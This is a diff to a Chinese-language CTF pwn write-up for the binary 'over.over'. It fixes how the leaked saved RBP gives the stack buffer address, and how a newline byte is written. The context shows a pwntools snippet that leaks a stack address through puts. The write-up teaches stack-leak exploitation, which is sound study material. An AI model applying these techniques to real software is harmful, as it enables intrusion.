@@ -241,7 +241,7 @@ int sub_400676()
 
 我们使用`puts`函数泄露出saved rbp，然后就能根据saved rbp的值推算出栈上各个数据的地址
 
-我们leak的时候靠的是运行`sub_400676()`这个函数中的puts函数，而传给puts的参数是位于`sub_400676`栈上的`buf`，`buf`挨着的是`sub_400676`栈上的saved rbp，而这个saved rbp是主调函数的，也就是`main`函数的`RBP`。我们需要计算`main`函数的`RBP`地址到`buf`的长度，长度值加上`main`函数的`RBP`即得到`buf`的地址。
+我们leak的时候靠的是运行`sub_400676()`这个函数中的puts函数，而传给puts的参数是位于`sub_400676`栈上的`buf`，`buf`挨着的是`sub_400676`栈上的saved rbp，而这个saved rbp是主调函数的，也就是`main`函数的`RBP`。我们需要计算`main`函数的`RBP`地址到`buf`的长度，`main`函数的`RBP`减去长度值即得到`buf`的地址。
 
 一种简单的计算方法是调试，在`main`函数下断点看看`RBP`的值，然后运行到`sub_400676`看看`buf`的地址，直接一减就出来了。
 
@@ -287,7 +287,7 @@ elf = ELF("./over.over")
 libc = elf.libc # 本地打，可以直接获取libc
 
 io.sendafter(b">", b'a' * 80)
-# 不能使用sendline，因为回车会影响read的读入。如果使用sendline，那么回车"\0a"会被作为数据录入，直接影响到saved rbp
+# 不能使用sendline，因为回车会影响read的读入。如果使用sendline，那么回车"\x0a"会被作为数据录入，直接影响到saved rbp
 
 buf = u64(io.recvuntil(b"\x7f")[-6: ].ljust(8, b'\0')) - 0x70
 # 这个程序本身会调用puts打印出我们输入的东西，而puts只有遇到"\0"才会停
